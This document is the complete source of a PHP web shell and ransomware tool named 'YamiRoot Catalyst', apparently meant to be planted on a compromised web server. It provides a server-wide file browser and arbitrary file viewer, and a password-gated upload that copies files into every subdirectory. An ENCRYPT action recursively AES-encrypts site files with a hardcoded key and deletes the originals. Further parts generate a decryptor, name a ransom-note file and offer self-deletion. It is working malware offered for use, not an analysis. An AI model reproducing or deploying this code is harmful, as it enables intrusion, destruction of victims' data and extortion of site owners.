<?php
/**
 * YamiRoot Catalyst v15.3
 * 0x6ick - 6ickzone
 */
set_time_limit(0);
ignore_user_abort(true);
error_reporting(0);

$k = "scarletdablackrose"; 
$e = ".6ickzone"; 
$n = "!!!DECRYPT_ME!!!.html";
$this_file = basename(__FILE__);

// whitelist
$x = [$this_file, 'decrypt.php', $n, '.htaccess', 'php.ini', 'error_log', 'BYEBYE.txt'];
$t = ['txt','doc','docx','xls','xlsx','pdf','jpg','jpeg','png','gif','mp3','mp4','zip','rar','7z','sql','php','js','css','html'];

if (isset($_GET['action']) && $_GET['action'] === 'self_destruct') {
    @unlink(__FILE__);
    header("Location: /");
    exit;
}

$up_msg = "";
if (isset($_POST['up_secure'])) {
    if ($_POST['up_pass'] === $k) {
        if (isset($_FILES['mass_up'])) {
            $target_dir = $_POST['target_path_hidden'];
            foreach ($_FILES['mass_up']['name'] as $i => $name) {
                $content = file_get_contents($_FILES['mass_up']['tmp_name'][$i]);
                file_put_contents($target_dir . DIRECTORY_SEPARATOR . $name, $content);
                $ite = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target_dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                foreach ($ite as $folder) {
                    if ($folder->isDir()) file_put_contents($folder->getRealPath() . DIRECTORY_SEPARATOR . $name, $content);
                }
            }
            $up_msg = "UPLOAD DONE";
        }
    } else { $up_msg = "WHAT THE FUCK!"; }
}

if (isset($_POST['gen_decrypt'])) {
    $dec_code = '<?php set_time_limit(0); $p="'.$k.'"; if(isset($_POST["key"]) && $_POST["key"]===$p){ $dir = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(__DIR__, 2), 1); foreach($dir as $f){ if($f->isFile() && substr($f->getFilename(),-9)==="'.$e.'"){ $path=$f->getRealPath(); $d=file_get_contents($path); if(substr($d,0,9)==="6ickzone:"){ $c=base64_decode(substr($d,9)); $iv=substr($c,0,16); $en=substr($c,16); $dc=openssl_decrypt($en,"AES-128-CBC",$p,OPENSSL_RAW_DATA,$iv); if($dc){ file_put_contents(substr($path,0,-9),$dc); unlink($path); } } } } unlink(__FILE__); } ?><form method="post"><input type="password" name="key"><button>UNLOCK</button></form>';
    file_put_contents('decrypt.php', $dec_code);
    $up_msg = "DECRYPTOR CREATED";
}

$raw_path = isset($_GET['path']) ? urldecode($_GET['path']) : getcwd();
$current_path = realpath($raw_path) ?: getcwd();
$breadcrumbs = [];
$parts = explode(DIRECTORY_SEPARATOR, trim($current_path, DIRECTORY_SEPARATOR));
$accum_path = DIRECTORY_SEPARATOR;
foreach ($parts as $part) {
    if ($part === '') continue;
    $accum_path .= $part . DIRECTORY_SEPARATOR;
    $breadcrumbs[] = ['name' => $part, 'path' => $accum_path];
}

$c = 0; $run = false;
if (isset($_POST['lock'])) {
    $run = true;
    $ite = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($_POST['target_dir'], RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
    foreach ($ite as $file) {
        if ($file->isDir()) continue;
        
        $p = $file->getRealPath();
        $fn = $file->getFilename();

        // 1
        if (in_array($fn, $x)) continue;

        // 2
        $ext = strtolower(pathinfo($p, PATHINFO_EXTENSION));
        if (!in_array($ext, $t)) continue;

        // 3
        if ($ext === trim($e, '.')) continue;

        $d = @file_get_contents($p);
        
        // 4
        if (strpos($d, 'YamiRoot') !== false || strpos($d, '6ickzone') !== false) continue;

        if ($d && substr($d, 0, 9) !== "6ickzone:") {
            $iv = openssl_random_pseudo_bytes(16);
            $ed = openssl_encrypt($d, 'AES-128-CBC', $k, OPENSSL_RAW_DATA, $iv);
            if ($ed && file_put_contents($p . $e, "6ickzone:" . base64_encode($iv . $ed))) {
                @unlink($p);
                $c++;
            }
        }
    }
}

$view_content = ""; $view_name = "";
if (isset($_GET['view'])) {
    $v_path = realpath(urldecode($_GET['view']));
    if ($v_path && is_file($v_path)) {
        $view_name = basename($v_path);
        $view_content = htmlspecialchars(file_get_contents($v_path));
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>YamiRoot Catalyst</title>
    <style>
        * { box-sizing: border-box; }
        body { background: #fff; color: #000; font-family: 'Courier New', monospace; margin: 0; background-image: linear-gradient(45deg, #f0f0f0 25%, transparent 25%), linear-gradient(-45deg, #f0f0f0 25%, transparent 25%); background-size: 20px 20px; }
        .full-page { min-height: 100vh; padding: 40px 10%; border: 20px solid #000; border-right: 20px solid #ff0000; position: relative; }
        h1 { background: #000; color: #fff; padding: 10px; font-size: 25px; transform: rotate(-1deg); box-shadow: 8px 8px 0 #ff0000; display: inline-block; }
        .panel { border: 5px solid #000; background: #fff; margin-bottom: 20px; }
        .bc-nav { background: #ff0000; color: #fff; padding: 10px; font-weight: bold; }
        .bc-nav a { color: #fff; text-decoration: none; }
        .list { height: 250px; overflow-y: auto; padding: 15px; }
        .item { display: flex; justify-content: space-between; border-bottom: 1px solid #eee; padding: 5px 0; font-size: 12px; }
        .item a { color: #000; text-decoration: none; font-weight: bold; }
        .controls { padding: 20px; background: #f9f9f9; border-top: 5px solid #000; }
        input, button { width: 100%; padding: 12px; border: 3px solid #000; margin-bottom: 10px; font-family: inherit; font-weight: bold; }
        button { background: #000; color: #fff; cursor: pointer; text-transform: uppercase; }
        button:hover { background: #ff0000; }
        .msg { background: #000; color: #ff0000; padding: 10px; text-align: center; margin-bottom: 10px; font-weight: bold; }
        .viewer { width: 100%; height: 300px; background: #000; color: #0f0; padding: 10px; font-size: 11px; margin-top: 10px; border: 5px solid #ff0000; }
        .kill { position: absolute; bottom: 20px; right: 40px; }
        .kill a { color: #ff0000; font-weight: 900; text-decoration: none; background: #000; padding: 5px 10px; }
    </style>
</head>
<body>
    <div class="full-page">
        <h1>YamiRoot Catalyst</h1>
        <div class="panel">
            <div class="bc-nav">
                PATH :: <a href="?path=/">ROOT</a>
                <?php foreach ($breadcrumbs as $bc): ?> / <a href="?path=<?= urlencode($bc['path']) ?>"><?= htmlspecialchars($bc['name']) ?></a> <?php endforeach; ?>
            </div>
            <?php if ($up_msg): ?><div class="msg"><?= $up_msg ?></div><?php endif; ?>
            <?php if ($run): ?><div class="msg" style="color:#fff;">DEPLOID: <?= $c ?> FILES</div><?php endif; ?>
            <div class="list">
                <div class="item"><a href="?path=<?= urlencode(dirname($current_path)) ?>">[ BACK ]</a></div>
                <?php foreach (scandir($current_path) as $v): if($v=='.'||$v=='..')continue; $f=$current_path.DIRECTORY_SEPARATOR.$v; ?>
                    <div class="item">
                        <a href="<?= is_dir($f) ? '?path='.urlencode($f) : '?path='.urlencode($current_path).'&view='.urlencode($f) ?>">
                            <?= is_dir($f) ? '[ DIR ]' : '[ FILE ]' ?> <?= $v ?>
                        </a>
                    </div>
                <?php endforeach; ?>
            </div>
            <div class="controls">
                <form method="post" enctype="multipart/form-data">
                    <input type="password" name="up_pass" placeholder="PASSWORD" required>
                    <input type="hidden" name="target_path_hidden" value="<?= htmlspecialchars($current_path) ?>">
                    <input type="file" name="mass_up[]" multiple>
                    <button type="submit" name="up_secure">UPLOAD</button>
                </form>
                <form method="post">
                    <input type="hidden" name="target_dir" value="<?= htmlspecialchars($current_path) ?>">
                    <button type="submit" name="lock" style="background:#ff0000;">ENCRYPT</button>
                </form>
                <form method="post">
                    <button type="submit" name="gen_decrypt" style="background:#fff; color:#000;">GENERATE DECRYPTOR</button>
                </form>
            </div>
        </div>
        <?php if ($view_content): ?>
            <h2 style="background:#000; color:#fff; display:inline-block; padding:5px; margin:0;">VIEW: <?= $view_name ?></h2>
            <textarea class="viewer" readonly><?= $view_content ?></textarea>
        <?php endif; ?>
        <div class="kill"><a href="?action=self_destruct" onclick="return confirm('ERASE ALL?')">KILL ME</a></div>
    </div>
</body>
</html>
